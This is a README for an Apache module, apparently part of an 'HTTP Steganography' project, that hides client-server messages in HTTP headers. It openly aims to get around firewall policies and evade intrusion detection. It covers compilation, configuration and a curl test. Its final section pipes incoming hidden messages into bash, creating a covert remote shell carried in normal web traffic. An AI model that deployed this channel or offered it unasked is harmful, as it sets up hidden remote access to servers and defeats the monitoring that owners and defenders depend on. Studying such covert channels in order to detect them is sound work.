steg-server
===========

Description
-----------
This is the server component of the HTTP Steganography project. 

This Apache module is meant to work together with the client component of the HTTP Steganography project to allow hidden client-server communication within the already established web channel, thus removing the need to work around firewall policies and hopefully evading intrusion detection systems. 

Quick Start
-----------
Make sure the 'httpd-devel' and 'openssl-devel' packages for CentOS/RHEL or the equivalent package for your distro are installed. These packages contain the header files and the 'apxs' tool necessary to compile this project.

To compile, just 'cd' into the cloned directory and run:
```
$ apxs -c -i -Iinclude mod_steg.c utils.c packet_builder.c config.c
```

Edit your httpd configuration file, e.g. /etc/httpd/conf/httpd.conf, and add a LoadModule directive:
```
LoadModule steg_module     modules/mod_steg.so
```

Finally, configure the Steg module. These are the module-specific directives:
* **stegInputFile**: Full path to the file where recevied information will be written. Server directive (outside Directory sections).
* **stegOutputFile**: Full path to the file where response information will be read from.  Server directive (outside Directory sections).
* **stegKnockCode**: Code that will be used to recognize a steganogram.
* **stegInputMethod**: Steganography method that will be used for incoming requests. For the first prototype, only Header will be available.
* **stegOutputMethod**: Steganography method that will be used for outgoing requests. For the first prototype, only Header will be available.
* **stegShmLockfile**: Lock file for the shared memory
* **stegShmFile**: Shared memory segment
* **stegCryptEnable**: Whether to enable payload encryption. For now, only AES-CBC-128 is supported.
* **stegCryptKey**: 256-bit (32 char) key to use for encryption.
* **stegCryptIV**: 128 (16 char) inizializtion vector for AES encryption.

Keep in mind that this module is implemented as two filters, so you need to use Apache's standard **setInputFilter** and **setOutputFilter** directives.


Example configuration:
```
stegInputFile /var/steg/input
stegOutputFile /var/steg/output
stegShmLockfile /var/steg/lock
stegShmFile /var/steg/shm

<Directory "/var/www/html">
  setInputFilter StegInput
  setOutputFilter StegOutput
  stegKnockCode 098asdf234
  stegInputMethod Header Accept-Encoding
  stegOutputMethod Header X-Powered-by
  #Only for testing, it will prevent normal content from being served:
  SetHandler steg
</Directory>

```

Restart httpd:
```
$ systemctl restart httpd.service
```

Testing
-------
For a simple standalone test, you can use curl:
```
$ curl -H "Accept-Encoding: gzip, deflate, <hidden message>"
```
The format of the message is:
```
knockcode|length|payload
```

Where **knockcode** is just what you configured in Apache, **length** is a 3 byte field that indicates the length of the payload, and **payload** is any string. Example:
```
knock005hello
```
To use all the features, install the **'steg-client'** http proxy and follow its usage guide.


Remote shell
------------
If the input and output files are piped through bash, you can obtain a remote shell (together with steg-client) that communicates exclusively through the http headers of the normal web requests you make while browsing that server's web content:
```
tail -f /var/steg/input | bash 2>/var/steg/output 1>&2
```






